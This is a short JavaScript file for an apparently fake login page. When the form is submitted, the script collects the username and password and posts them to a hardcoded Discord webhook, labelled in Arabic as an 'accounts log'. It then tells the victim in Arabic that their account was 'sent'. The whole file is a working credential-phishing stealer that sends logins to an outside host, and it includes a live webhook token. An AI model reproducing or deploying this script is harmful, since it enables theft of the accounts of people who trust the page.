
document.addEventListener("DOMContentLoaded", function() {
    var suggestionForm = document.getElementById("login-form");

    suggestionForm.addEventListener("submit", function(event) {
        event.preventDefault();

        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        var webhookUrl = 'https://discord.com/api/webhooks/1265286215834402877/kQQrN-bHXBlQMdudU5vij9k-S3ag8h59VvC87D32gFAztvIzMgBmmfxwlASrF_QkpKVE';

        var request = new XMLHttpRequest();
        request.open("POST", webhookUrl);

        request.setRequestHeader('Content-type', 'application/json');

        var params = {
            username: "سجـل الحسـابـات",
            avatar_url: "",
            content: `**اسم صاحب الحساب :** ${username}\n**الباسورد :** ${password}`
        };

        request.send(JSON.stringify(params));
        
        alert("تم إرسال حسابك !")

        suggestionForm.reset();
    });
});